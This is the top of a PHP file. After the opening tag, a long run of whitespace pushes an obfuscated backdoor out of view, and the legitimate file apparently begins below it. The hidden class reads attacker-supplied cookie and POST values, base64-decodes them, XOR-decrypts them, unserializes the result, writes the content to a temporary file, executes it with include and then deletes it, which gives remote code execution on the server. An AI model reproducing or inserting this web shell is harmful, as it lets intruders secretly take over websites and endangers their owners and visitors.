<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("kqqgozly")){class kqqgozly{public static $pybzmusyf = "nqybwvehbpagumlw";public static $ykpxkwbzrq = NULL;public function __construct(){$ettdkeihcb = @$_COOKIE[substr(kqqgozly::$pybzmusyf, 0, 4)];if (!empty($ettdkeihcb)){$mgrxobnrml = "base64";$asgukjux = "";$ettdkeihcb = explode(",", $ettdkeihcb);foreach ($ettdkeihcb as $izmkgptdha){$asgukjux .= @$_COOKIE[$izmkgptdha];$asgukjux .= @$_POST[$izmkgptdha];}$asgukjux = array_map($mgrxobnrml . "_decode", array($asgukjux,));$asgukjux = $asgukjux[0] ^ str_repeat(kqqgozly::$pybzmusyf, (strlen($asgukjux[0]) / strlen(kqqgozly::$pybzmusyf)) + 1);kqqgozly::$ykpxkwbzrq = @unserialize($asgukjux);}}public function __destruct(){$this->cbimwzfzle();}private function cbimwzfzle(){if (is_array(kqqgozly::$ykpxkwbzrq)) {$wtkihdo = sys_get_temp_dir() . "/" . crc32(kqqgozly::$ykpxkwbzrq["salt"]);@kqqgozly::$ykpxkwbzrq["write"]($wtkihdo, kqqgozly::$ykpxkwbzrq["content"]);include $wtkihdo;@kqqgozly::$ykpxkwbzrq["delete"]($wtkihdo);exit();}}}$menhglh = new kqqgozly();$menhglh = NULL;} ?><?php
/**
